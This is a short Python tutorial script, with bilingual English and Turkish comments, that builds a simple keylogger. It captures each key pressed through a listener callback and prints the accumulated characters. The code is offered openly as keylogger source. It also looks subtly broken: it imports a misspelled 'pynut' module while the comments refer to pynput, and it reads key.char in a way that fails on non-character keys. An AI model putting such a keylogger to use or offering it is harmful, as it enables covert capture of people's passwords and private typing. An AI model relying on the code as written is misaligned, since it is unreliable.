import pynut.keyboard as pynut#First of all, we include the library that allows us to detect and save keyboard inputs in our project.--Öncelikle klavye girişlerini tespit etmemizi ve kaydetmemizi sağlayan kütüphaneyi projemize dahil ediyoruz.
log = ""#We define an empty sring named "log" in order to save the recorded keys in the proper word form.--Kaydedilen anahtarları uygun kelime biçiminde kaydetmek için "log" adında boş bir dizge tanımlarız.

def callback_function(key):#We create a call_back function to process the data sent from pynut_Listener.--Pynput Listener'dan gönderilen verileri işlemek için bir geri çağırma işlevi oluşturuyoruz.
    global log#We express it as "global" while using the log variable we define for use everywhere.--Her yerde kullanmak için tanımladığımız log değişkenini kullanırken bunu "global" olarak ifade ediyoruz.
    log = log + str(key.char)#When retrieving data, we use key.char expression to pull only the character parts.--Verileri alırken, sadece karakter kısımlarını çekmek için key.char ifadesini kullanırız.
    print(log)

key_logger = pynut.Listener(on_press = callback_function)#We create variable using the pynput library Listener module.--Pynput library Listener modülünü kullanarak değişken oluşturuyoruz.

with key_logger:#In order to properly handle unmanaged data streams, we call our key_logger variable in  "with" function.--Yönetilmeyen veri akışlarını düzgün bir şekilde işlemek için, key_logger değişkenimizi "with" işlevinde çağırıyoruz.
    key_logger.join()